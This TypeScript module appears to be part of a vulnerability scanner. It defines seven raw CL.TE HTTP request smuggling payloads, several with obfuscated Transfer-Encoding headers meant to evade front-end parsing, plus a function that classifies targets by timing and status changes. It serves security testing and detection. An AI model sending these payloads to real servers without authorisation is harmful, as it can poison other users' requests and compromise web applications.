// Adapted from source-reference/vantix/secops/skills/ patterns.
// Rewritten in TypeScript. No runtime dependency on the vendored source.
import type { FamilyMetadata, OracleClassification, PayloadVariant, ProbeContext, ScannerResponseInput } from '../types';

export const META: FamilyMetadata = {
  id: 'request-smuggling-cl-te',
  family: 'request-smuggling',
  title: 'HTTP request smuggling — CL.TE',
  severity: 'critical',
  destructiveRisk: 'low',
  requiresOast: false,
  requiresBrowser: false,
  insertionPointKinds: ['header', 'body'],
  expectedSignals: ['timeout-delta', 'extra-response', 'status-delta', 'length-delta'],
  cwe: [444],
};

export function variants(_ctx: ProbeContext): PayloadVariant[] {
  return [
    {
      id: 'smug-cl-te-basic',
      family: 'request-smuggling',
      value: 'Transfer-Encoding: chunked\r\nContent-Length: 6\r\n\r\n0\r\n\r\nX',
      encoding: 'raw',
      intent: 'CL.TE: front-end uses CL, back-end uses TE — trailing byte poisons next request',
      destructiveRisk: 'low',
      expectedSignals: ['timeout-delta', 'extra-response'],
    },
    {
      id: 'smug-cl-te-obfuscated-te',
      family: 'request-smuggling',
      value: 'Transfer-Encoding: xchunked\r\nContent-Length: 6\r\n\r\n0\r\n\r\nX',
      encoding: 'raw',
      intent: 'CL.TE with obfuscated TE value "xchunked"',
      destructiveRisk: 'low',
      expectedSignals: ['timeout-delta', 'extra-response'],
    },
    {
      id: 'smug-cl-te-tab-te',
      family: 'request-smuggling',
      value: 'Transfer-Encoding:\tchunked\r\nContent-Length: 6\r\n\r\n0\r\n\r\nX',
      encoding: 'raw',
      intent: 'CL.TE with tab before "chunked" to evade front-end TE detection',
      destructiveRisk: 'low',
      expectedSignals: ['timeout-delta'],
    },
    {
      id: 'smug-cl-te-space-te',
      family: 'request-smuggling',
      value: 'Transfer-Encoding : chunked\r\nContent-Length: 6\r\n\r\n0\r\n\r\nX',
      encoding: 'raw',
      intent: 'CL.TE with space before colon in TE header',
      destructiveRisk: 'low',
      expectedSignals: ['timeout-delta'],
    },
    {
      id: 'smug-cl-te-chunked-ext',
      family: 'request-smuggling',
      value: 'Transfer-Encoding: chunked, identity\r\nContent-Length: 6\r\n\r\n0\r\n\r\nX',
      encoding: 'raw',
      intent: 'CL.TE with TE extension "chunked, identity" to bypass middleware',
      destructiveRisk: 'low',
      expectedSignals: ['timeout-delta'],
    },
    {
      id: 'smug-cl-te-newline-te',
      family: 'request-smuggling',
      value: 'Transfer-Encoding:\nchunked\r\nContent-Length: 6\r\n\r\n0\r\n\r\nX',
      encoding: 'raw',
      intent: 'CL.TE using bare LF after header name',
      destructiveRisk: 'low',
      expectedSignals: ['timeout-delta'],
    },
    {
      id: 'smug-cl-te-time-probe',
      family: 'request-smuggling',
      value: 'Transfer-Encoding: chunked\r\nContent-Length: 4\r\n\r\n1\r\nZ',
      encoding: 'raw',
      intent: 'CL.TE timing probe: incomplete chunk causes back-end to wait',
      destructiveRisk: 'none',
      expectedSignals: ['timeout-delta'],
    },
  ];
}

export function classify(
  resp: ScannerResponseInput,
  variant: PayloadVariant,
  baseline: ScannerResponseInput,
): OracleClassification {
  const evidence: string[] = [];
  let responseClass: OracleClassification['responseClass'] = 'neutral-or-not-parsed';
  let confidence = 0.1;
  let nextAction: OracleClassification['nextAction'] = 'continue';

  const timingDelta = resp.responseTimeMs - baseline.responseTimeMs;
  const statusDelta = resp.statusCode !== baseline.statusCode;

  if (timingDelta > 4000) {
    responseClass = 'timing-delta';
    confidence = 0.75;
    nextAction = 'confirm';
    evidence.push(`Timing delta ${timingDelta}ms above baseline — back-end waiting on incomplete chunk (variant: ${variant.id})`);
  } else if (statusDelta && resp.statusCode === 400) {
    responseClass = 'method-or-parser-rejected';
    confidence = 0.7;
    nextAction = 'stop-negative';
    evidence.push(`400 response suggests TE header rejected (variant: ${variant.id})`);
  } else if (statusDelta) {
    responseClass = 'status-delta';
    confidence = 0.5;
    nextAction = 'confirm';
    evidence.push(`Unexpected status ${resp.statusCode} vs baseline ${baseline.statusCode}`);
  } else {
    nextAction = 'continue';
    evidence.push('No clear timing or status signal from CL.TE probe');
  }

  return { payloadVariantId: variant.id, responseClass, confidence, evidence, nextAction };
}
